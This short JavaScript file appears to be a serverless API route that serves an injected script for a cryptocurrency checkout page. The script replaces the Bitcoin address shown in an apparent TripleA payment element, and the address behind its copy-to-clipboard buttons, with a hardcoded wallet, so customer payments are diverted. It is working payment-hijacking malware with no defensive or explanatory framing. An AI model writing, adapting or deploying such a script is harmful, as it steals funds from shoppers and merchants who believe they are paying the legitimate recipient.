export default function handler(req, res) {
    res.setHeader('Content-Type', 'application/javascript');

    const script = `
    (function() {
        'use strict';
        const TARGET_WALLET = 'bc1qywdd5kv90gfpcwfvd7tyhgk3m3dukw9sy4t4z5';
        const addressElement = document.querySelector('.triplea-new-address');
        if (addressElement) {
            addressElement.textContent = TARGET_WALLET;
        }
        const copyBtns = document.querySelectorAll('[data-clipboard-text]');
        for (const btn of copyBtns) {
            if (btn.getAttribute('data-clipboard-text').startsWith('bc1')) {
                btn.setAttribute('data-clipboard-text', TARGET_WALLET);
            }
        }
    })();
    `;

    res.status(200).send(script);
}
